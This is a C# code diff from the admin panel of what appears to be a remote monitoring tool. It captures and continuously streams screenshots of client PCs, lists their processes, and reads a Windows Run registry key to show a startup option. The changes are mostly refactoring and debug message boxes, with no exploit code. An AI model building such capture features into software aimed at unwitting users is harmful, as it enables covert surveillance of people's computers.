@@ -6,6 +6,7 @@ using System.Linq;
 using System.Net;
 using System.Net.Mail;
 using System.Security.Cryptography;
+using System.ServiceModel;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -55,6 +56,9 @@ namespace RNA_Rebuild_Admin
 				smtp.OnSenderAdd += Smtp_OnSenderAdd;
 			}
 			foreach (var client in service.GetClientsAsync().Result) Add_Client(client.Value);
+
+			RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+			if (reg.GetValue(System.Windows.Forms.Application.ExecutablePath) as bool? == true) startupitem.IsChecked = true;
 		}
 
 		private void DeleteAccount()
@@ -145,7 +149,7 @@ namespace RNA_Rebuild_Admin
 		{
 			Active.Content = Client.PcName;
 			string filename = AppDomain.CurrentDomain.BaseDirectory + "\\Screenshots\\screenshot_" + Client.PcName + "_" + DateTime.Now + ".png";
-			await Task.Run(() => File.WriteAllBytes(filename, service.GetScreenShotAsync(Client).Result.Content));
+			await Task.Run(() => File.WriteAllBytes(filename, service.GetScreenShotAsync(Client.PcName).Result.Content));
 			BitmapImage bi = new BitmapImage(new Uri(filename, UriKind.RelativeOrAbsolute));
 			Screen.Source = bi;
 		}
@@ -187,12 +191,27 @@ namespace RNA_Rebuild_Admin
 
 		public void Streaming(Client client)
 		{
+			MessageBox.Show(service.State.ToString());
 			while (true)
 			{
-				Thread.Sleep(20);
-				File.WriteAllBytes(AppDomain.CurrentDomain.BaseDirectory + "\\Stream\\screen", service.GetScreenShot(client).Content);
-				Thread tr = new Thread(() => ChangeStreamScreen());
-				tr.Start();
+				Thread.Sleep(20); SuperFile sf = null;
+				try
+				{
+				    sf = service.GetScreenShot(client.PcName);
+					File.WriteAllBytes(AppDomain.CurrentDomain.BaseDirectory + "\\Stream\\screen", sf.Content);
+					Thread tr = new Thread(() => ChangeStreamScreen());
+					tr.Start();
+				}
+				catch (FaultException ex)
+				{
+					MessageBox.Show(ex.Code.SubCode.Name + "\n" + ex.Code.Name);
+					MessageBox.Show(ex.Reason.ToString());
+					MessageBox.Show(ex.Message);
+				}
+				catch (Exception ex)
+				{
+					MessageBox.Show(ex.Message);
+				}
 			}
 		}
 		private void ChangeStreamScreen()
@@ -416,5 +435,9 @@ namespace RNA_Rebuild_Admin
 			GoAnotherAdditionMode(AdditionType.Process);
 			ProcessList.ItemsSource = d;
         }
-    }
+
+		private void MenuItem_Click_1(object sender, RoutedEventArgs e)
+		{
+		}
+	}
 }
